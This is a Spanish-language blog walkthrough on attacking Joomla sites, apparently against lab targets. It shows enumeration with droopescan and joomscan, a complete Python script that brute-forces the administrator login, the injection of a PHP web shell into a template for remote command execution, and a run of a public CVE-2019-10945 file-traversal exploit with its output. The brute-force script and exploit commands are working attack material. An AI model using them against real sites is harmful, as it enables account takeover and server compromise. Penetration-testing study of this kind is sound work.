---
date: 2025-11-02T23:15:05.000Z
layout: post
comments: true
title: "Hacking Joomla"
subtitle: 'Tipos de ataque'
description: >-
image: >-
  /images/joomlalogo.png
optimized_image: >-
  /images/joomlalogo.png
category: ciberseguridad
tags:
  - web
  - rce
  - owasp
  - joomla
  - php
  - cms
author: Felipe Canales Cayuqueo
paginate: true
---

Joomla es un sistema de gestión de contenidos (CMS) de código abierto que permite crear, organizar y administrar sitios web de manera sencilla. Está desarrollado en PHP y utiliza MySQL como base de datos. Se destaca por su flexibilidad, su amplia comunidad de desarrolladores y la posibilidad de ampliar sus funciones mediante extensiones y plantillas. Es una alternativa popular a WordPress y Drupal, ideal tanto para sitios personales como corporativos.

### Enumeración

#### Droopescan

[Droopescan](https://github.com/SamJoan/droopescan) puede realizar **cuatro tipos de pruebas**. Por defecto, se ejecutan todas, pero puedes especificar una con las banderas **-e** o **--enumerate**:

p -- **Comprobación de plugins:** realiza varios miles de solicitudes HTTP y devuelve una lista de todos los plugins encontrados en el host de destino.

t -- **Comprobación de temas:** igual que la anterior, pero aplicada a los temas.

v -- **Comprobación de versión:** descarga varios archivos y, basándose en las sumas de verificación (checksums) de estos archivos, devuelve una lista de todas las versiones posibles.

i -- **Comprobación de URLs interesantes:** busca URLs interesantes (paneles de administración, archivos readme, etc.).

Si bien es compatible con SilverStripe, Wordpress y Drupal. Tiene ciertas funcionalidades para Joomla y Moodle.

#### Detección de posible versión

```
┌──(root㉿nptg)-[/joomla]
└─# droopescan scan joomla --url http://test.local
```

#### Joomscan

[Joomscan](https://github.com/OWASP/joomscan) es un proyecto de OWASP esarrollado con el objetivo de automatizar la tarea de detección de vulnerabilidades de Joomla CMS.

Esta herramienta puede ayudarnos a encontrar directorio, archivos accesibles y a tomar huellas dactilares de las extensiones instaladas.

```
┌──(root㉿nptg)-[/joomla]
└─# perl joomscan.pl -u dev.inlanefreight.local

   ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dev.inlanefreight.local ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.9.4

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://dev.inlanefreight.local/administrator/components
http://dev.inlanefreight.local/administrator/modules
http://dev.inlanefreight.local/administrator/templates
http://dev.inlanefreight.local/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.inlanefreight.local/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.inlanefreight.local/robots.txt 

Interesting path found from robots.txt
http://dev.inlanefreight.local/joomla/administrator/
http://dev.inlanefreight.local/administrator/
http://dev.inlanefreight.local/bin/
http://dev.inlanefreight.local/cache/
http://dev.inlanefreight.local/cli/
http://dev.inlanefreight.local/components/
http://dev.inlanefreight.local/includes/
http://dev.inlanefreight.local/installation/
http://dev.inlanefreight.local/language/
http://dev.inlanefreight.local/layouts/
http://dev.inlanefreight.local/libraries/
http://dev.inlanefreight.local/logs/
http://dev.inlanefreight.local/modules/
http://dev.inlanefreight.local/plugins/
http://dev.inlanefreight.local/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/dev.inlanefreight.local/

```

> IMPORTANTE: Al ejecutarlo se te reseteará la terminal por lo que perderás lo que tengas previamente en ella. Se recomienda ejecutarlo en otra terminal.


### Explotación

#### Fuerza bruta

La cuenta de administrador predeterminada en las instalaciones de Joomla es ```admin```, pero la contraseña se establece en el momento de la instalación. Por lo tanto la única forma de poder acceder es a través de una contraseña débil. Para ello se recomienda usar el siguiente script.

```python
#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urlparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Joomla():

    def __init__(self):
        self.initializeVariables()
        self.sendrequest()

    def initializeVariables(self):
        #Initialize args
        parser = argparse.ArgumentParser(description='Joomla login bruteforce')
        #required
        parser.add_argument('-u', '--url', required=True, type=str, help='Joomla site')
        parser.add_argument('-w', '--wordlist', required=True, type=str, help='Path to wordlist file')

        #optional
        parser.add_argument('-p', '--proxy', type=str, help='Specify proxy. Optional. http://127.0.0.1:8080')
        parser.add_argument('-v', '--verbose', action='store_true', help='Shows output.')
        #these two arguments should not be together
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-usr', '--username', type=str, help='One single username')
        group.add_argument('-U', '--userlist', type=str, help='Username list')

        args = parser.parse_args()

        #parse args and save proxy
        if args.proxy:
            parsedproxyurl = urlparse(args.proxy)
            self.proxy = { parsedproxyurl[0] : parsedproxyurl[1] }
        else:
            self.proxy=None

        #determine if verbose or not
        if args.verbose:
            self.verbose=True
        else:
            self.verbose=False

        #http:/site/administrator
        self.url = args.url+'/administrator/'
        self.ret = 'aW5kZXgucGhw'
        self.option='com_login'
        self.task='login'
        #Need cookie
        self.cookies = requests.session().get(self.url).cookies.get_dict()
        #Wordlist from args
        self.wordlistfile = args.wordlist
        self.username = args.username
        self.userlist = args.userlist

    def sendrequest(self):
        if self.userlist:
            for user in self.getdata(self.userlist):
                self.username=user.decode('utf-8')
                self.doGET()
        else:
            self.doGET()

    def doGET(self):
        for password in self.getdata(self.wordlistfile):
            #Custom user-agent :)
            headers = {
                'User-Agent': 'nano'
            }

            #First GET for CSSRF
            r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies, headers=headers)
            soup = BeautifulSoup(r.text, 'html.parser')
            longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
            password=password.decode('utf-8')

            data = {
                'username' : self.username,
                'passwd' : password,
                'option' : self.option,
                'task' : self.task,
                'return' : self.ret,
                longstring : 1
            }
            r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies, headers=headers)
            soup = BeautifulSoup(r.text, 'html.parser')
            response = soup.find('div', {'class': 'alert-message'})
            if response:
                if self.verbose:
                    print(f'{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')
            else:
                print(f'{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')
                break

    @staticmethod
    def getdata(path):
        with open(path, 'rb+') as f:
            data = ([line.rstrip() for line in f])
            f.close()
        return data


joomla = Joomla()

```

En donde la forma de uso es el siguiente:

```
┌──(root㉿nptg)-[/joomla]
└─# python3 joomla-brute.py -u http://test.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

Al ejecutar el comando anterior, el script inicia un ataque por fuerza bruta utilizando la wordlist. Durante ese tiempo la consola puede no mostrar salida frecuente y dar la impresión de estar “bloqueada”. En realidad está leyendo la wordlist y enviando peticiones una por una (o por lotes), por lo que la actividad continúa en segundo plano hasta que se encuentra una credencial válida o se completa la lista. Si se encuentra una credencial, el script la mostrará; mientras tanto, es esperado que la interfaz no responda con frecuencia.

Tras iniciar sesión con las credenciales si recibe un error que dice "Se ha producido un error". Llame a una función miembro format() en null" después de iniciar sesión, navegue hasta "http://test.local/administrator/index.php?option=com_plugins" y deshabilite el complemento "Icono rápido - Verificación de versión de PHP". Esto permitirá que el panel de control se muestre correctamente.


#### Ejecución remota de comandos (RCE)

Una vez que obtenemos las credenciales de administrador, podemos modificar por ejemplo los templates del sitio para inyectar código PHP y así ejecutar comandos en el servidor.

[![joomla1](/images/joomla1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/joomla1.png)

[![joomla2](/images/joomla2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/joomla2.png)

En este ejemplo hemos subido una *web shell* en PHP (una shell gráfica) disponible en la sección [reverse shell](https://nptg24.github.io/reverse-shell/#php) del blog. La shell permite ejecutar comandos remotos a través del navegador una vez que el archivo PHP queda accesible desde la ruta pública del sitio.

[![joomla3](/images/joomla3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/joomla3.png)

Finalmente, accedemos al archivo PHP modificado en la ruta del template en este caso `/templates/protostar/error.php` y verificamos que la shell se carga correctamente, confirmando la capacidad de ejecutar comandos en el servidor.

[![joomla4](/images/joomla4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/joomla4.png)

#### Búsqueda de exploits públicos

Habiendo identificado la versión (por ejemplo, **Joomla 3.9.4**), el siguiente paso es **investigar** si existen vulnerabilidades públicas asociadas a esa versión y qué exploits se encuentran disponibles.

[![joomla5](/images/joomla5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/joomla5.png)

[![joomla6](/images/joomla6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/joomla6.png)

[![joomla7](/images/joomla7.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/joomla7.png)

Finalmente se comprueba con éxito la vulnerabilidad.

```
┌──(root㉿nptg)-[/joomla]
└─# python3 CVE-2019-10945.py --url 'http://dev.inlanefreight.local/administrator/' --username admin --password admin --dir /                                                              
 
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       


administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
flag_6470e394cbf6dab6a91682cc8585059b.txt
htaccess.txt
index.php
robots.txt
web.config.txt

```

